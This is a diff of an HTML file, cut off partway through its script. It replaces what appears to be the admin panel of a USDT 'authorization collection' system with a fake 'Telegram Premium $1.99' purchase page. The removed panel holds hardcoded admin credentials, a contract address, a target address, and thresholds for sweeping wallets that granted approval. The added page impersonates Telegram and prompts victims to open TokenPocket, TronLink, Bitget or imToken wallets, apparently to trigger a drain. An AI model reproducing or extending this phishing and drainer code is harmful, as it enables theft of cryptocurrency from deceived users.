@@ -2,1374 +2,679 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT归集监控系统 - 专业版</title>
-    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram Premium - 高级订阅服务</title>
     <style>
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-text-size-adjust: 100%;
+        }
+        
+        html {
+            font-size: 16px;
+        }
+        
+        @media (max-width: 480px) {
+            html { font-size: 14px; }
+        }
+        
+        @media (max-width: 360px) {
+            html { font-size: 13px; }
         }
         
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #1a2a4a 0%, #2a5298 100%);
-            margin: 0;
-            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
             min-height: 100vh;
+            min-height: 100dvh;
+            padding: 1rem;
+            line-height: 1.5;
+            overflow-x: hidden;
         }
-
-        .login-container {
-            background: white;
-            border-radius: 12px;
-            padding: 40px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            width: 400px;
+        
+        .container {
+            width: 100%;
+            max-width: 28rem;
+            margin: 0 auto;
+            padding: 0.5rem;
+        }
+        
+        .header {
             text-align: center;
-            position: absolute;
+            margin-bottom: 2rem;
+            padding: 0 0.5rem;
+        }
+        
+        .header h1 {
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(90deg, #ffd700, #ff8c00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-weight: 700;
+        }
+        
+        .header p {
+            font-size: 0.95rem;
+            opacity: 0.9;
+        }
+        
+        .pricing-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 1.25rem;
+            padding: 1.5rem;
+            margin: 0 auto;
+            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+        }
+        
+        .pricing-header h2 {
+            font-size: 1.4rem;
+            margin-bottom: 0.5rem;
+            color: #ffd700;
+            font-weight: 600;
+        }
+        
+        .price {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin: 1rem 0;
+            color: #ffd700;
+        }
+        
+        .price span {
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        
+        .description {
+            margin-bottom: 1.5rem;
+            font-size: 0.95rem;
+            opacity: 0.9;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: linear-gradient(90deg, #ff8c00, #ffd700);
+            color: #1e3c72;
+            padding: 1rem 1.5rem;
+            border-radius: 3rem;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 1rem;
+            touch-action: manipulation;
+            min-height: 3.5rem;
+            animation: breathe 2s ease-in-out infinite;
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 0.125rem 0.5rem rgba(255, 140, 0, 0.4);
+            animation: none;
+        }
+        
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            animation: none;
+        }
+        
+        @keyframes breathe {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
+            }
+            50% {
+                transform: scale(1.03);
+                box-shadow: 0 0.5rem 1.5rem rgba(255, 140, 0, 0.6);
+            }
+        }
+        
+        .form-container {
+            display: none;
+            margin-top: 1.5rem;
+            text-align: left;
+        }
+        
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            font-size: 0.95rem;
+        }
+        
+        input {
+            width: 100%;
+            padding: 1rem;
+            border-radius: 0.75rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 1rem;
+            min-height: 3.5rem;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #ffd700;
+        }
+        
+        .wallet-container {
+            display: none;
+            margin-top: 1.5rem;
+            text-align: left;
+        }
+        
+        .wallet-options {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.75rem;
+            margin: 1rem 0 1.5rem 0;
+        }
+        
+        .wallet-option {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 0.75rem;
+            padding: 1.25rem 0.5rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+            min-height: 5rem;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .wallet-option:active {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #ffd700;
+            transform: scale(0.98);
+        }
+        
+        .wallet-icon {
+            width: 2.5rem;
+            height: 2.5rem;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .wallet-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 0.5rem;
+        }
+        
+        .wallet-name {
+            font-weight: 600;
+            font-size: 0.85rem;
+            line-height: 1.2;
+        }
+        
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 1rem;
+        }
+        
+        .step-number {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 2rem;
+            height: 2rem;
+            background: #ffd700;
+            color: #1e3c72;
+            border-radius: 50%;
+            font-weight: bold;
+            margin-right: 0.75rem;
+            font-size: 0.9rem;
+            flex-shrink: 0;
+        }
+        
+        .step-text {
+            font-size: 0.95rem;
+            padding-top: 0.25rem;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.75rem;
+            margin-top: 2rem;
+        }
+        
+        .feature {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 1.25rem 0.5rem;
+            border-radius: 0.75rem;
+            text-align: center;
+        }
+        
+        .feature-icon {
+            font-size: 1.8rem;
+            margin-bottom: 0.75rem;
+            color: #ffd700;
+        }
+        
+        .feature h3 {
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            line-height: 1.2;
+        }
+        
+        .feature p {
+            font-size: 0.75rem;
+            opacity: 0.9;
+            line-height: 1.3;
+        }
+        
+        .temporary-message {
+            position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-        }
-
-        .login-container h1 {
-            color: #1e3c72;
-            margin-bottom: 30px;
-            font-size: 24px;
-        }
-
-        .login-form input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 14px;
-        }
-
-        .captcha-container {
-            display: flex;
-            gap: 10px;
-            margin: 10px 0;
-        }
-
-        .captcha-input {
-            flex: 1;
-        }
-
-        .captcha-img {
-            height: 44px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            cursor: pointer;
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            background: rgba(0, 0, 0, 0.9);
             color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-
-        .login-btn:hover {
-            opacity: 0.9;
-        }
-
-        .admin-container {
-            display: none;
-            background: white;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px;
-            min-height: calc(100vh - 40px);
-        }
-
-        .admin-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .logout-btn {
-            background: #ff4444;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .stat-card {
-            background: #f8f9fa;
-            border-radius: 8px;
-            padding: 15px;
-            text-align: center;
-            border-left: 4px solid #0088cc;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-
-        .stat-card:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-        }
-
-        .stat-card.warning {
-            border-left-color: #ff9800;
-        }
-
-        .stat-card.danger {
-            border-left-color: #ff4444;
-        }
-
-        .stat-card.success {
-            border-left-color: #4CAF50;
-        }
-
-        .stat-value {
-            font-size: 24px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 5px;
-        }
-
-        .stat-label {
-            font-size: 12px;
-            color: #666;
-        }
-
-        .admin-panel {
-            background: #f8f9fa;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 15px 0;
-        }
-
-        .panel-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .wallet-list, .transaction-list {
-            max-height: 500px;
-            overflow-y: auto;
-        }
-
-        .wallet-item {
-            background: white;
-            border: 1px solid #e0e0e0;
-            border-radius: 6px;
-            padding: 12px;
-            margin-bottom: 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .wallet-info {
-            flex: 1;
-        }
-
-        .wallet-address {
-            font-family: monospace;
-            font-size: 11px;
-            margin-bottom: 4px;
-        }
-
-        .wallet-balance {
-            font-weight: bold;
-            color: #2e7d32;
-        }
-
-        .wallet-balance.high {
-            color: #d32f2f;
-        }
-
-        .wallet-meta {
-            font-size: 10px;
-            color: #666;
-        }
-
-        .collect-btn {
-            background: #ff9800;
-            color: white;
-            border: none;
-            padding: 6px 12px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 11px;
-            margin-left: 5px;
-        }
-
-        .collect-btn:hover {
-            background: #f57c00;
-        }
-
-        .monitor-controls {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        .btn {
-            padding: 8px 16px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: bold;
-        }
-
-        .btn-primary {
-            background: #0088cc;
-            color: white;
-        }
-
-        .btn-success {
-            background: #4CAF50;
-            color: white;
-        }
-
-        .btn-warning {
-            background: #ff9800;
-            color: white;
-        }
-
-        .btn-danger {
-            background: #ff4444;
-            color: white;
-        }
-
-        .tabs {
-            display: flex;
-            border-bottom: 1px solid #e0e0e0;
-            margin-bottom: 15px;
-        }
-
-        .tab {
-            padding: 10px 20px;
-            cursor: pointer;
-            border-bottom: 2px solid transparent;
-        }
-
-        .tab.active {
-            border-bottom-color: #0088cc;
-            color: #0088cc;
-            font-weight: bold;
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        .log-container {
-            background: #1e1e1e;
-            color: #00ff00;
-            font-family: monospace;
-            font-size: 11px;
-            padding: 15px;
-            border-radius: 6px;
-            max-height: 300px;
-            overflow-y: auto;
-            margin-top: 15px;
-        }
-
-        .log-entry {
-            margin-bottom: 5px;
-            line-height: 1.4;
-        }
-
-        .log-time {
-            color: #888;
-        }
-
-        .log-info {
-            color: #4fc3f7;
-        }
-
-        .log-warning {
-            color: #ffb74d;
-        }
-
-        .log-error {
-            color: #f44336;
-        }
-
-        .log-success {
-            color: #4CAF50;
-        }
-
-        .token-balance {
-            display: inline-block;
-            background: #e3f2fd;
-            padding: 2px 6px;
-            border-radius: 4px;
-            margin: 2px;
-            font-size: 10px;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
+            padding: 1rem 2rem;
+            border-radius: 0.75rem;
             z-index: 1000;
+            text-align: center;
+            max-width: 80%;
+            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.3);
         }
-
-        .modal-content {
-            background: white;
-            margin: 5% auto;
-            padding: 20px;
-            border-radius: 8px;
-            width: 90%;
-            max-width: 800px;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-
-        .modal-header {
-            display: flex;
-            justify-content: between;
-            align-items: center;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .close-modal {
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            color: #666;
-        }
-
-        .address-details {
-            margin-top: 15px;
-        }
-
-        .asset-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px;
-            border-bottom: 1px solid #f0f0f0;
-        }
-
-        .transaction-record {
-            font-size: 11px;
-            color: #666;
-            margin-top: 4px;
-        }
-
-        .setting-group {
-            margin-bottom: 20px;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 6px;
-        }
-
-        .setting-group h4 {
-            margin-bottom: 10px;
-            color: #333;
-        }
-
-        .setting-item {
-            margin-bottom: 10px;
-        }
-
-        .setting-item label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #555;
-        }
-
-        .setting-item input {
-            width: 100%;
-            padding: 8px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-
-        .admin-account-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px;
-            border: 1px solid #e0e0e0;
-            border-radius: 6px;
-            margin-bottom: 8px;
-            background: white;
+        
+        @media (max-width: 320px) {
+            .wallet-options {
+                grid-template-columns: 1fr;
+                gap: 0.5rem;
+            }
+            
+            .features {
+                grid-template-columns: 1fr;
+                gap: 0.5rem;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- 登录界面 -->
-    <div class="login-container" id="loginContainer">
-        <h1>USDT归集监控系统 - 专业版</h1>
-        <div class="login-form">
-            <input type="text" id="username" placeholder="用户名" required>
-            <input type="password" id="password" placeholder="密码" required>
-            <div class="captcha-container">
-                <input type="text" id="captcha" class="captcha-input" placeholder="验证码" required>
-                <img id="captcha-img" class="captcha-img" src="about:blank" alt="验证码">
-            </div>
-            <button class="login-btn" id="login-btn" onclick="login()">登录</button>
+    <div class="container">
+        <div class="header">
+            <h1>Telegram 高级订阅服务</h1>
+            <p>使用您的加密货币钱包获取 Telegram Premium 订阅</p>
         </div>
-        <div id="loginMessage" style="color: red; margin-top: 10px; font-size: 12px;"></div>
-    </div>
-
-    <!-- 管理界面 -->
-    <div class="admin-container" id="adminContainer">
-        <div class="admin-header">
-            <h1>USDT归集监控系统 - 专业版</h1>
-            <div class="user-info">
-                <span>欢迎，<span id="currentUser">管理员</span></span>
-                <span id="session-time">会话剩余: 60分钟</span>
-                <button class="logout-btn" onclick="logout()">安全退出</button>
+        
+        <div class="pricing-card">
+            <div class="pricing-header">
+                <h2>Telegram Premium</h2>
+                <div class="price">$1.99<span>/月</span></div>
+                <p class="description">为您自己或您的朋友和同事兑换享受专属功能和无限制体验</p>
             </div>
-        </div>
-
-        <div class="stats-grid">
-            <div class="stat-card" onclick="showLargeWallets()">
-                <div class="stat-value" id="large-wallets">0</div>
-                <div class="stat-label">大额钱包 (≥100U)</div>
-            </div>
-            <div class="stat-card warning" onclick="showSmallWallets()">
-                <div class="stat-value" id="small-wallets">0</div>
-                <div class="stat-label">小额钱包 (<100U)</div>
-            </div>
-            <div class="stat-card success" onclick="showContractAddress()">
-                <div class="stat-value" id="contract-balance">0</div>
-                <div class="stat-label">合约地址</div>
-            </div>
-            <div class="stat-card info" onclick="showTargetAddress()">
-                <div class="stat-value" id="target-balance">0</div>
-                <div class="stat-label">目标地址</div>
-            </div>
-        </div>
-
-        <div class="monitor-controls">
-            <button id="start-monitor" class="btn-success">启动监控</button>
-            <button id="stop-monitor" class="btn-danger">停止监控</button>
-            <button id="refresh-data" class="btn-primary">刷新数据</button>
-            <button id="manual-collect-all" class="btn-warning">手动归集所有</button>
-        </div>
-
-        <div class="tabs">
-            <div class="tab active" data-tab="wallets">钱包监控</div>
-            <div class="tab" data-tab="transactions">归集记录</div>
-            <div class="tab" data-tab="security">系统管理</div>
-        </div>
-
-        <div class="tab-content active" id="wallets-tab">
-            <div class="admin-panel">
-                <div class="panel-header">
-                    <h3>钱包资产监控</h3>
-                    <div>
-                        <span style="font-size: 12px; color: #666;">
-                            授权归集阈值: <span id="current-threshold">100</span> USDT | 
-                            合约阈值: <span id="current-contract-threshold">2000</span> USDT
-                        </span>
-                    </div>
-                </div>
-                <div class="wallet-list" id="wallet-list">
-                    <div style="text-align: center; color: #666; padding: 20px;">
-                        正在加载钱包数据...
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="tab-content" id="transactions-tab">
-            <div class="admin-panel">
-                <div class="panel-header">
-                    <h3>资金归集记录</h3>
-                    <button id="clear-transactions" class="btn-danger">清空记录</button>
-                </div>
-                <div class="transaction-list" id="transaction-list">
-                    <div style="text-align: center; color: #666; padding: 20px;">
-                        暂无归集记录
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="tab-content" id="security-tab">
-            <div class="admin-panel">
-                <div class="panel-header">
-                    <h3>系统管理</h3>
+            
+            <button id="purchaseBtn" class="btn">立即购买</button>
+            
+            <div id="userForm" class="form-container">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-text">填写接收 Premium 订阅的 Telegram 用户信息</div>
                 </div>
                 
-                <div class="setting-group">
-                    <h4>管理员账号管理</h4>
-                    <div id="admin-accounts-list">
-                        <!-- 管理员账号列表 -->
-                    </div>
-                    <div style="margin-top: 15px;">
-                        <input type="text" id="new-admin-username" placeholder="新管理员用户名" style="padding: 8px; margin-right: 10px;">
-                        <input type="password" id="new-admin-password" placeholder="新管理员密码" style="padding: 8px; margin-right: 10px;">
-                        <button id="add-admin" class="btn-primary">添加管理员</button>
-                    </div>
+                <div class="form-group">
+                    <label for="username">Telegram 用户名</label>
+                    <input type="text" id="username" placeholder="例如: @username" required>
                 </div>
-
-                <div class="setting-group">
-                    <h4>系统参数设置</h4>
-                    <div class="setting-item">
-                        <label>合约地址:</label>
-                        <input type="text" id="contract-address" value="TLrrSzT1rKahBYRZnaPfqmXnoky9wmxMvi">
+                
+                <div class="form-group">
+                    <label for="nickname">用户昵称</label>
+                    <input type="text" id="nickname" placeholder="例如: 张三" required>
+                </div>
+                
+                <button id="confirmBtn" class="btn">确认支付 $1.99</button>
+            </div>
+            
+            <div id="walletSection" class="wallet-container">
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-text">选择付款钱包</div>
+                </div>
+                
+                <div class="wallet-options">
+                    <div class="wallet-option" onclick="wakeupWalletApp('TokenPocket')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/yBbDWDrc/Token-Pocket.png" alt="TokenPocket" onerror="this.style.display='none'; this.parentNode.innerHTML='🔷';">
+                        </div>
+                        <div class="wallet-name">TokenPocket</div>
                     </div>
-                    <div class="setting-item">
-                        <label>目标收款地址:</label>
-                        <input type="text" id="target-address" value="TBcTQiYyxXkJffXhXGYEokedsV4vBqHvB8">
+                    
+                    <div class="wallet-option" onclick="wakeupWalletApp('TronLink')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/N2dhDDmF/tronlink.png" alt="TronLink" onerror="this.style.display='none'; this.parentNode.innerHTML='🔶';">
+                        </div>
+                        <div class="wallet-name">TronLink</div>
                     </div>
-                    <div class="setting-item">
-                        <label>合约地址阈值 (自动划转):</label>
-                        <input type="number" id="contract-threshold" value="2000">
+                    
+                    <div class="wallet-option" onclick="wakeupWalletApp('Bitget')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/gbqHxTKN/Bitget-wallet.png" alt="Bitget Wallet" onerror="this.style.display='none'; this.parentNode.innerHTML='💰';">
+                        </div>
+                        <div class="wallet-name">Bitget Wallet</div>
                     </div>
-                    <div class="setting-item">
-                        <label>授权归集阈值:</label>
-                        <input type="number" id="collect-threshold" value="100">
+                    
+                    <div class="wallet-option" onclick="wakeupWalletApp('imToken')">
+                        <div class="wallet-icon">
+                            <img src="https://i.ibb.co/C3L6Lkd1/imtoken.png" alt="imToken" onerror="this.style.display='none'; this.parentNode.innerHTML='💳';">
+                        </div>
+                        <div class="wallet-name">imToken</div>
                     </div>
-                    <button id="save-system-settings" class="btn-success">保存系统设置</button>
                 </div>
             </div>
         </div>
-    </div>
-
-    <!-- 模态框 -->
-    <div id="address-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3 id="modal-title">地址详情</h3>
-                <button class="close-modal" onclick="closeModal()">&times;</button>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">
+                    <img src="https://i.ibb.co/4n WVZXSp/open-folder-file-icon-219486.png" alt="更大文件上传" style="width: 40px; height: 40px;">
+                </div>
+                <h3>更大文件上传</h3>
+                <p>上传最大 4GB 的文件</p>
             </div>
-            <div id="modal-content">
-                <!-- 动态内容 -->
+            
+            <div class="feature">
+                <div class="feature-icon">
+                    <img src="https://i.ibb.co/C58QKWSM/1695711361784527.jpg" alt="更快的下载速度" style="width: 40px; height: 40px;">
+                </div>
+                <h3>更快的下载速度</h3>
+                <p>享受无限制的下载速度</p>
+            </div>
+            
+            <div class="feature">
+                <div class="feature-icon">
+                    <img src="https://i.ibb.co/whwVyw5b/Telegram-logo-svg.webp" alt="专属贴纸" style="width: 40px; height: 40px;">
+                </div>
+                <h3>专属贴纸</h3>
+                <p>使用 Premium 专属动画贴纸</p>
+            </div>
+            
+            <div class="feature">
+                <div class="feature-icon">
+                    <img src="https://i.ibb.co/XZKJLw9b/photo-2025-10-31-23-15-28.jpg" alt="高级聊天管理" style="width: 40px; height: 40px;">
+                </div>
+                <h3>高级聊天管理</h3>
+                <p>创建群组链接和更多管理工具</p>
             </div>
         </div>
     </div>
 
     <script>
-        // 系统配置
-        const SYSTEM_CONFIG = {
-            CONTRACT_ADDRESS: 'TLrrSzT1rKahBYRZnaPfqmXnoky9wmxMvi',
-            TARGET_ADDRESS: 'TBcTQiYyxXkJffXhXGYEokedsV4vBqHvB8',
-            CONTRACT_THRESHOLD: 2000,
-            COLLECT_THRESHOLD: 100,
-            SCAN_INTERVAL: 1000,
-            SESSION_TIMEOUT: 60
-        };
-
-        // 用户账户
-        const USERS = {
-            'admin': { 
-                password: 'admin123',
-                name: '超级管理员',
-                role: 'super_admin'
+        // 显示临时消息函数
+        function showTemporaryMessage(message) {
+            const existingMessage = document.querySelector('.temporary-message');
+            if (existingMessage) {
+                existingMessage.remove();
             }
-        };
-
-        class USDTMonitorSystem {
-            constructor() {
-                this.wallets = [];
-                this.transactions = [];
-                this.monitorInterval = null;
-                this.isMonitoring = false;
-                this.currentUser = null;
-                this.sessionTimer = null;
-                this.failedLoginAttempts = 0;
-                this.loginLockUntil = 0;
-                this.contractBalance = 0;
-                this.targetBalance = 0;
-                
-                this.init();
-            }
-
-            async init() {
-                this.loadLocalData();
-                this.initEventListeners();
-                this.checkExistingSession();
-                this.generateCaptcha();
-                this.addLog('系统初始化完成', 'info');
-                
-                await this.updateAllBalances();
-            }
-
-            // 生成验证码
-            generateCaptcha() {
-                const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-                let captcha = '';
-                for (let i = 0; i < 4; i++) {
-                    captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'temporary-message';
+            messageDiv.textContent = message;
+            document.body.appendChild(messageDiv);
+            
+            setTimeout(() => {
+                if (messageDiv.parentNode) {
+                    messageDiv.remove();
                 }
-                
-                sessionStorage.setItem('captcha', captcha);
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = 100;
-                canvas.height = 40;
-                const ctx = canvas.getContext('2d');
-                
-                ctx.fillStyle = '#f0f0f0';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                
-                for (let i = 0; i < 5; i++) {
-                    ctx.strokeStyle = `rgb(${Math.random() * 100}, ${Math.random() * 100}, ${Math.random() * 100})`;
-                    ctx.beginPath();
-                    ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
-                    ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
-                    ctx.stroke();
-                }
-                
-                ctx.font = 'bold 24px Arial';
-                ctx.fillStyle = '#333';
-                ctx.textAlign = 'center';
-                ctx.textBaseline = 'middle';
-                
-                for (let i = 0; i < captcha.length; i++) {
-                    const x = 20 + i * 20;
-                    const y = 20 + Math.random() * 4 - 2;
-                    ctx.save();
-                    ctx.translate(x, y);
-                    ctx.rotate((Math.random() - 0.5) * 0.4);
-                    ctx.fillText(captcha[i], 0, 0);
-                    ctx.restore();
-                }
-                
-                document.getElementById('captcha-img').src = canvas.toDataURL();
-            }
-
-            refreshCaptcha() {
-                this.generateCaptcha();
-            }
-
-            isLoginLocked() {
-                if (this.loginLockUntil > Date.now()) {
-                    const remaining = Math.ceil((this.loginLockUntil - Date.now()) / 1000);
-                    return `登录尝试过多，请等待 ${remaining} 秒后重试`;
-                }
-                return false;
-            }
-
-            checkExistingSession() {
-                const session = localStorage.getItem('adminSession');
-                if (session) {
-                    try {
-                        const sessionData = JSON.parse(session);
-                        if (sessionData && Date.now() - sessionData.loginTime < SYSTEM_CONFIG.SESSION_TIMEOUT * 60 * 1000) {
-                            this.login(sessionData.username, sessionData.password, true);
-                        }
-                    } catch (e) {
-                        console.error('会话数据损坏:', e);
-                    }
-                }
-            }
-
-            login(username, password, isSessionLogin = false) {
-                const lockStatus = this.isLoginLocked();
-                if (lockStatus && !isSessionLogin) {
-                    document.getElementById('loginMessage').textContent = lockStatus;
-                    return false;
-                }
-
-                if (!isSessionLogin) {
-                    const captcha = document.getElementById('captcha').value;
-                    const storedCaptcha = sessionStorage.getItem('captcha');
-                    
-                    if (!captcha || captcha.toUpperCase() !== storedCaptcha) {
-                        document.getElementById('loginMessage').textContent = '验证码错误';
-                        this.generateCaptcha();
-                        return false;
-                    }
-                }
-
-                if (!USERS[username] || USERS[username].password !== password) {
-                    if (!isSessionLogin) {
-                        this.failedLoginAttempts++;
-                        document.getElementById('loginMessage').textContent = '用户名或密码错误';
-                        this.generateCaptcha();
-                        
-                        if (this.failedLoginAttempts >= 5) {
-                            this.loginLockUntil = Date.now() + 15 * 60 * 1000;
-                            document.getElementById('loginMessage').textContent = '登录尝试过多，账户已锁定15分钟';
-                            document.getElementById('login-btn').disabled = true;
-                            setTimeout(() => {
-                                document.getElementById('login-btn').disabled = false;
-                                this.failedLoginAttempts = 0;
-                            }, 15 * 60 * 1000);
-                        }
-                    }
-                    return false;
-                }
-
-                this.currentUser = { username, ...USERS[username] };
-                
-                localStorage.setItem('adminSession', JSON.stringify({
-                    username,
-                    password,
-                    loginTime: Date.now()
-                }));
-
-                this.addLog(`用户 ${username} 登录成功`, 'success');
-
-                document.getElementById('loginContainer').style.display = 'none';
-                document.getElementById('adminContainer').style.display = 'block';
-                document.getElementById('currentUser').textContent = this.currentUser.name;
-
-                this.startSessionTimer();
-                this.failedLoginAttempts = 0;
-
-                return true;
-            }
-
-            startSessionTimer() {
-                const sessionStart = Date.now();
-                const updateTimer = () => {
-                    const elapsed = Date.now() - sessionStart;
-                    const remaining = SYSTEM_CONFIG.SESSION_TIMEOUT * 60 - Math.floor(elapsed / 1000);
-                    
-                    if (remaining <= 0) {
-                        this.addLog('会话已过期，自动退出', 'warning');
-                        this.logout();
-                        return;
-                    }
-                    
-                    const minutes = Math.floor(remaining / 60);
-                    const seconds = remaining % 60;
-                    document.getElementById('session-time').textContent = `会话剩余: ${minutes}:${seconds.toString().padStart(2, '0')}`;
-                };
-                
-                updateTimer();
-                this.sessionTimer = setInterval(updateTimer, 1000);
-            }
-
-            logout() {
-                localStorage.removeItem('adminSession');
-                if (this.sessionTimer) {
-                    clearInterval(this.sessionTimer);
-                }
-                location.reload();
-            }
-
-            loadLocalData() {
-                try {
-                    const savedWallets = localStorage.getItem('monitorWallets');
-                    const savedTransactions = localStorage.getItem('monitorTransactions');
-                    const savedSettings = localStorage.getItem('systemSettings');
-                    const savedUsers = localStorage.getItem('adminUsers');
-                    
-                    if (savedWallets) this.wallets = JSON.parse(savedWallets);
-                    if (savedTransactions) this.transactions = JSON.parse(savedTransactions);
-                    if (savedSettings) Object.assign(SYSTEM_CONFIG, JSON.parse(savedSettings));
-                    if (savedUsers) Object.assign(USERS, JSON.parse(savedUsers));
-                    
-                    this.updateDisplay();
-                } catch (e) {
-                    console.error('加载数据失败:', e);
-                }
-            }
-
-            saveLocalData() {
-                localStorage.setItem('monitorWallets', JSON.stringify(this.wallets));
-                localStorage.setItem('monitorTransactions', JSON.stringify(this.transactions));
-                localStorage.setItem('systemSettings', JSON.stringify(SYSTEM_CONFIG));
-                localStorage.setItem('adminUsers', JSON.stringify(USERS));
-            }
-
-            initEventListeners() {
-                document.querySelectorAll('.tab').forEach(tab => {
-                    tab.addEventListener('click', () => this.switchTab(tab.dataset.tab));
-                });
-
-                document.getElementById('start-monitor').addEventListener('click', () => this.startMonitor());
-                document.getElementById('stop-monitor').addEventListener('click', () => this.stopMonitor());
-                document.getElementById('refresh-data').addEventListener('click', () => this.refreshAllData());
-                document.getElementById('manual-collect-all').addEventListener('click', () => this.manualCollectAll());
-                document.getElementById('clear-transactions').addEventListener('click', () => this.clearTransactions());
